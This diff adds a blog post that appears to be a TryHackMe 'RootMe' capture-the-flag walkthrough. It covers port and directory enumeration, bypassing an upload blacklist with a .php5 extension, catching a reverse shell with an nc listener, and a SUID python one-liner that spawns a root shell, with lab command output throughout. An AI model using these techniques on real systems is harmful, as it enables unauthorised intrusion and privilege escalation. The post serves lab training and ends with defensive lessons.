@@ -1,0 +1,87 @@
+---
+title: "THM: RootMe — full walkthrough"
+date: "2026-05-20"
+platform: "TryHackMe"
+difficulty: "easy"
+tags: ["thm", "web", "file-upload", "privesc", "linux"]
+excerpt: "A classic beginner box: enumerate, bypass a file upload filter, pop a reverse shell, then abuse a misconfigured SUID binary for root."
+---
+
+> **Box:** RootMe — TryHackMe | **Attack path:** web upload → reverse shell → SUID python → root
+
+## recon
+
+Every box starts the same way: make noise on the wire and see what answers.
+
+```bash
+$ nmap -sC -sV -oN scans/initial.txt 10.10.10.10
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.29
+```
+
+Two doors: SSH (no creds yet) and a web server. Web first — always web first on an easy box.
+
+## enumeration
+
+Directory brute-force to see what Apache is hiding:
+
+```bash
+$ gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
+/css                  (Status: 301)
+/js                   (Status: 301)
+/panel                (Status: 301)   <-- interesting
+/uploads              (Status: 301)   <-- very interesting
+```
+
+`/panel` is a **file upload form**. `/uploads` is where the files land. If the filter is weak, this box is already over.
+
+## exploitation — file upload bypass
+
+First attempt: upload `shell.php`. Blocked — the filter blacklists `.php`. Classic mistake: blacklisting extensions instead of validating content.
+
+Bypass: rename the payload to `shell.php5`, which Apache's PHP handler will still execute:
+
+```bash
+$ cp shell.php shell.php5
+# listener ready on our side
+$ nc -lvnp 4444
+```
+
+Upload succeeds. Browse to `http://10.10.10.10/uploads/shell.php5` and the listener lights up:
+
+```bash
+connect to [10.9.9.9] from (UNKNOWN) [10.10.10.10] 38124
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Shell as `www-data`. User flag is readable in `/var/www/user.txt`.
+
+## privilege escalation — SUID python
+
+Enumerate what can run as root without a password — SUID binaries are the usual suspects:
+
+```bash
+$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/python      <-- oh no
+/usr/bin/su
+/usr/bin/sudo
+...
+```
+
+`python` with the SUID bit set means we can spawn a root shell in one line (shoutout to GTFOBins):
+
+```bash
+$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Root flag: `/root/root.txt`. Box owned in about 15 minutes.
+
+## lessons
+
+- **Blacklist filtering is not security.** `.php5`, `.phtml`, `.pht` — there's always a cousin the filter forgot.
+- **SUID on interpreters is game over.** Any SUID binary that can exec commands (python, perl, vim, find) is a root shell waiting to happen.
+- Methodology beats luck: *scan → enumerate → exploit → enumerate again → escalate.*
